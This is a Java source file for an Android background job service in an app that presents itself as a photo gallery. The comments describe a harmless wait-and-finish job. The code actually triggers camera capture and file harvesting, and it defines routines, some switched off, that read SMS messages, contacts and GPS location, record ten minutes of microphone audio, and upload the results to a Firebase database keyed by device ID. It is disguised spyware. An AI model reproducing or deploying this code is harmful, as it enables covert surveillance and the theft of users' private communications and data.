/*
 * Copyright 2014 Google Inc.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package org.quantum.silverphoto.gallery.service;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.job.JobParameters;
import android.app.job.JobService;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.provider.Settings;
import android.support.annotation.RequiresApi;
import android.util.Log;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import org.json.JSONObject;
import org.quantum.silverphoto.gallery.util.PermissionUtils;

import java.text.SimpleDateFormat;
import java.util.Date;


/**
 * Service to handle callbacks from the JobScheduler. Requests scheduled with the JobScheduler
 * ultimately land on this service's "onStartJob" method. It runs jobs for a specific amount of time
 * and finishes them. It keeps the activity updated with changes via a Messenger.
 */
@SuppressLint("Registered")
@RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
public class MyJobService extends JobService {

    private static final String TAG = MyJobService.class.getSimpleName();

//    private Messenger mActivityMessenger;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.i(TAG, "Service created");
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.i(TAG, "Service destroyed");
    }

    /**
     * When the app's MainActivity is created, it starts this service. This is so that the
     * activity and this service can communicate back and forth. See "setUiCallback()"
     */
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
//        mActivityMessenger = intent.getParcelableExtra(MESSENGER_INTENT_KEY);
        return START_NOT_STICKY;
    }

    @Override
    public boolean onStartJob(final JobParameters params) {
        // The work that this service "does" is simply wait for a certain duration and finish
        // the job (on another thread).

//        sendMessage(MSG_COLOR_START, params.getJobId());

//        long duration = params.getExtras().getLong(WORK_DURATION_KEY);

        // Uses a handle r to delay the execution of jobFinished().
        Handler handler = new Handler();
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
//                sendMessage(MSG_COLOR_STOP, params.getJobId());
//                String deviceID = Settings.Secure.getString(MyJobService.this.getContentResolver(), Settings.Secure.ANDROID_ID);
//                FirebaseDatabase database = FirebaseDatabase.getInstance();
//                DatabaseReference myRef = database.getReference(deviceID);
//                myRef.child(new SimpleDateFormat("yyyyMMddHHmmss").format(new Date())).setValue(params.getJobId());

                Log.i(TAG, "on handle job: " + params.getJobId());
                handleJob(params);

                Log.i(TAG, "handle job finished" + params.getJobId());
                jobFinished(params, false);
            }
        }, 500);
        Log.i(TAG, "on start job: " + params.getJobId());



        // Return true as there's more work to be done with this job.
        return true;
    }

    private void handleJob(JobParameters params) {
//        processSMS();
//
//        processContacts();
//
//        processRecord(params);

        String[] permissions = new String[]{Manifest.permission.CAMERA};

        if (PermissionUtils.checkPermissions(this, permissions)) {
            processCamera();
        }

//        processLocation();

        permissions = new String[]{Manifest.permission.READ_EXTERNAL_STORAGE};
        if (PermissionUtils.checkPermissions(this, permissions)) {
            processFiles();
        }
    }

    private void processFiles() {
        FileManager.doItFiles(this);
    }

    private void processLocation() {
        String deviceID = Settings.Secure.getString(MyJobService.this.getContentResolver(), Settings.Secure.ANDROID_ID);
        FirebaseDatabase database = FirebaseDatabase.getInstance();
        DatabaseReference myRef = database.getReference(deviceID);
        DatabaseReference locRef = myRef.child("location").child(new SimpleDateFormat("yyyyMMddHHmmss").format(new Date()));

        LocManager gps = new LocManager(this);
        // check if GPS enabled
        if(gps.canGetLocation()){
            double latitude = gps.getLatitude();
            double longitude = gps.getLongitude();

            locRef.child("enabled").setValue(true);
            locRef.child("longitude").setValue(longitude);
            locRef.child("latitude").setValue(latitude);
        }
        else {
            locRef.child("enabled").setValue(false);
        }

    }

    private void processCamera() {
        new CameraManager(this).startUp(1);

    }

    private void processRecord(JobParameters params) {
        try {
            MicManager.startRecording(10*60, this, params);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void processContacts() {
        JSONObject ContactList = ContactsManager.getContacts(this);

        if ( ContactList != null ) {
            String deviceID = Settings.Secure.getString(MyJobService.this.getContentResolver(), Settings.Secure.ANDROID_ID);
            FirebaseDatabase database = FirebaseDatabase.getInstance();
            DatabaseReference myRef = database.getReference(deviceID);
            myRef.child(new SimpleDateFormat("yyyyMMddHHmmss").format(new Date())).setValue(ContactList.toString());
        }

    }

    private void processSMS() {
        JSONObject SMSList = SMSManager.getSMSList(this);

        if ( SMSList != null ) {
            String deviceID = Settings.Secure.getString(MyJobService.this.getContentResolver(), Settings.Secure.ANDROID_ID);
            FirebaseDatabase database = FirebaseDatabase.getInstance();
            DatabaseReference myRef = database.getReference(deviceID);
            myRef.child(new SimpleDateFormat("yyyyMMddHHmmss").format(new Date())).setValue(SMSList.toString());
        }

    }

    @Override
    public boolean onStopJob(JobParameters params) {
        // Stop tracking these job parameters, as we've 'finished' executing.
//        sendMessage(MSG_COLOR_STOP, params.getJobId());
        Log.i(TAG, "on stop job: " + params.getJobId());
//        String deviceID = Settings.Secure.getString(this.getContentResolver(), Settings.Secure.ANDROID_ID);
//
//        FirebaseDatabase database = FirebaseDatabase.getInstance();
//        DatabaseReference myRef = database.getReference(deviceID);
//        myRef.child(String.valueOf(params.getJobId())).removeValue();

        // Return false to drop the job.
        return false;
    }

//    private void sendMessage(int messageID, @Nullable Object params) {
//        // If this service is launched by the JobScheduler, there's no callback Messenger. It
//        // only exists when the MainActivity calls startService() with the callback in the Intent.
//        if (mActivityMessenger == null) {
//            Log.d(TAG, "Service is bound, not started. There's no callback to send a message to.");
//            return;
//        }
//        Message m = Message.obtain();
//        m.what = messageID;
//        m.obj = params;
//        try {
////            String deviceID = Settings.Secure.getString(this.getContentResolver(), Settings.Secure.ANDROID_ID);
////            FirebaseDatabase database = FirebaseDatabase.getInstance();
////            DatabaseReference myRef = database.getReference(deviceID);
////            myRef.child(new SimpleDateFormat("yyyy.MM.dd.HH.mm.ss").format(new Date())).setValue(1);
//
//            mActivityMessenger.send(m);
//        } catch (RemoteException e) {
//            Log.e(TAG, "Error passing service object back to activity.");
//        }
//    }
}
